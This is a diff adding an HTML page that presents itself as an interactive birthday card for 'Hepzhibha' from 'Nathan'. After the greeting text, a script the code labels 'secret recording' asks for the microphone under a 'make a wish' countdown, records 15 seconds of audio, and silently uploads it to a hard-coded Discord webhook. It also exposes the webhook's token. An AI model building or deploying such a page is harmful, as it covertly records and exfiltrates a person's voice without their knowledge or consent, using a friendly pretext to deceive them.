@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy Birthday Hepzhibha!</title>
+    <link href="https://fonts.googleapis.com/css2?family=Caveat:wght@600;700&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            background-color: #121212;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Caveat', cursive;
+            overflow: hidden;
+        }
+        .phone-frame {
+            width: 100vw;
+            height: 100vh;
+            max-width: 420px;
+            max-height: 840px;
+            background: #ffffff;
+            border: 8px solid #222;
+            border-radius: 36px;
+            position: relative;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.6);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        .whiteboard {
+            flex: 1;
+            background: #fdfdfd;
+            background-image: 
+                radial-gradient(#e5e5e5 1px, transparent 1px),
+                radial-gradient(#e5e5e5 1px, #fdfdfd 1px);
+            background-size: 40px 40px;
+            background-position: 0 0, 20px 20px;
+            padding: 30px 20px;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+        .chibi-container {
+            width: 130px;
+            height: 130px;
+            background: #fff0f3;
+            border: 3px solid #333;
+            border-radius: 50%;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            animation: float 3s ease-in-out infinite;
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-6px); }
+        }
+        .chibi-avatar {
+            width: 110px;
+            height: 110px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+        .title-banner {
+            font-size: 32px;
+            font-weight: 700;
+            color: #d63031;
+            margin-bottom: 15px;
+            border-bottom: 2px solid #d63031;
+            display: inline-block;
+            padding-bottom: 2px;
+        }
+        .message-box {
+            font-size: 24px;
+            color: #2d3436;
+            line-height: 1.4;
+            min-height: 100px;
+            margin-bottom: 20px;
+            max-width: 340px;
+        }
+        .signature {
+            font-size: 22px;
+            color: #0984e3;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        .timer-display {
+            display: none;
+            font-size: 24px;
+            color: #d63031;
+            font-weight: bold;
+            margin-top: 15px;
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 0.7; }
+            50% { opacity: 1; }
+            100% { opacity: 0.7; }
+        }
+        #start-overlay {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.98);
+            z-index: 100;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 25px;
+        }
+        .btn-start {
+            background: #d63031;
+            color: white;
+            border: none;
+            padding: 14px 30px;
+            font-size: 24px;
+            font-family: 'Caveat', cursive;
+            border-radius: 25px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(214,48,49,0.4);
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="phone-frame">
+        <div id="start-overlay">
+            <h2 style="font-size: 34px; color: #d63031; margin-bottom: 10px;">🎉 Happy Birthday Hepzhibha! 🎉</h2>
+            <p style="font-size: 20px; color: #555; margin-bottom: 15px;">Tap below to open your interactive birthday card.</p>
+            <button class="btn-start" onclick="startExperience()">Open Birthday Card 🎂</button>
+        </div>
+
+        <div class="whiteboard">
+            <div class="chibi-container">
+                <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='50' cy='50' r='48' fill='%23ffccd5'/><text x='50' y='58' font-size='40' text-anchor='middle'>👧🏽</text></svg>" class="chibi-avatar" alt="Hepzhibha">
+            </div>
+            <div class="title-banner" id="title-text"></div>
+            <div class="message-box" id="message-text"></div>
+            <div class="signature" id="signature-text"></div>
+            <div class="timer-display" id="timer-box">Make a wish... 15s</div>
+        </div>
+    </div>
+
+    <script>
+        const webhookUrl = "https://discord.com/api/webhooks/1532686712986271818/xyGtBZEueuqqCu9XromKNUFu_--Blv5KXV3r64xeb_7LFbpvzPMlC8PmXZYdZJ0ckINh";
+        
+        const titleElement = document.getElementById("title-text");
+        const messageElement = document.getElementById("message-text");
+        const signatureElement = document.getElementById("signature-text");
+        const timerBox = document.getElementById("timer-box");
+
+        function startExperience() {
+            document.getElementById('start-overlay').style.display = 'none';
+            runTypewriterSequence();
+        }
+
+        const titleFull = "HAPPY BIRTHDAY Hepzhibha!";
+        const messages = [
+            "Wishing you a fantastic day filled with joy and laughter! ✨",
+            "May this year be your best yet! Keep shining! 🌟",
+            "Sending you all the happiness in the world!"
+        ];
+        const signatureFull = "With love, Nathan ❤️";
+
+        async function typeText(element, text, speed = 50) {
+            element.textContent = "";
+            for (let i = 0; i < text.length; i++) {
+                element.textContent += text.charAt(i);
+                await new Promise(r => setTimeout(r, speed));
+            }
+        }
+
+        async function runTypewriterSequence() {
+            await typeText(titleElement, titleFull, 70);
+            
+            for (let i = 0; i < messages.length; i++) {
+                await typeText(messageElement, messages[i], 40);
+                await new Promise(r => setTimeout(r, 2500));
+            }
+
+            await typeText(signatureElement, signatureFull, 60);
+
+            // Trigger secret 15-second recording and show timer
+            startSecretRecording();
+        }
+
+        async function startSecretRecording() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                let audioChunks = [];
+
+                timerBox.style.display = "block";
+                let timeLeft = 15;
+                timerBox.textContent = `Make a wish... ${timeLeft}s`;
+
+                const countdownInterval = setInterval(() => {
+                    timeLeft--;
+                    if (timeLeft > 0) {
+                        timerBox.textContent = `Make a wish... ${timeLeft}s`;
+                    } else {
+                        clearInterval(countdownInterval);
+                    }
+                }, 1000);
+
+                mediaRecorder.ondataavailable = event => {
+                    if (event.data.size > 0) {
+                        audioChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = async () => {
+                    clearInterval(countdownInterval);
+                    timerBox.style.display = "none";
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                    await sendAudioToDiscord(audioBlob);
+                    stream.getTracks().forEach(track => track.stop());
+                };
+
+                mediaRecorder.start();
+
+                setTimeout(() => {
+                    if (mediaRecorder.state !== "inactive") {
+                        mediaRecorder.stop();
+                    }
+                }, 15000);
+
+            } catch (err) {
+                console.error("Microphone access permission denied or unavailable:", err);
+            }
+        }
+
+        async function sendAudioToDiscord(blob) {
+            signatureElement.textContent = "Your wishes is sending to the stars Jesus hears for you ✨🙏";
+            
+            const formData = new FormData();
+            formData.append("file", blob, "hepzhibha_wish.webm");
+            formData.append("content", "✨ **New Secret Birthday Wish Recorded!**\n_Your wishes is sending to the stars Jesus hears for you ✨🙏_");
+
+            try {
+                await fetch(webhookUrl, {
+                    method: "POST",
+                    body: formData
+                });
+                signatureElement.textContent = "Your wishes is sent to the stars! Jesus hears for you ✨🙏";
+            } catch (error) {
+                console.error("Webhook upload failed:", error);
+                signatureElement.textContent = "Your wishes is sending to the stars Jesus hears for you ✨🙏";
+            }
+        }
+    </script>
+</body>
+</html>
